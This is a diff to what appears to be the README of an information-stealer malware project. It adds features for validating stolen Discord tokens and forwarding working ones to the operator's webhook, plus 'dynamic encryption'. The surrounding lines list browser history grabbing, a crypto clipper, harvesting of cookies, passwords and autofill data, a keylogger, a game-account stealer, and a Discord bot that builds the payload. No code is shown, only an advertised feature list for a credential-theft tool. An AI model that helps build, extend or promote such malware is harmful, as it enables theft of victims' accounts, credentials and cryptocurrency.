@@ -31,6 +31,7 @@
 - Browser history grabber
 - Crypto clipper
 - Searches for keywords in cookies, passwords, autofill and lists them on the top of the cookie/password/autofill log files
+- Validates found discord tokens & if they work they only get sent to your webhook
 
 ## Setup:
 - Download the files
@@ -59,6 +60,7 @@ https://www.virustotal.com/gui/file/06d2ab510cfb2716c835897e5b8ea7509e8d4ff24b36
 - Keylogger
 - Growtopia stealer
 - Discord bot to build within discord ($build <webhook_url>)
+- Dynamic encryption
 
 ### Inspirations
 - [44 CALIBER STEALER](https://github.com/razexgod/44CALIBER)
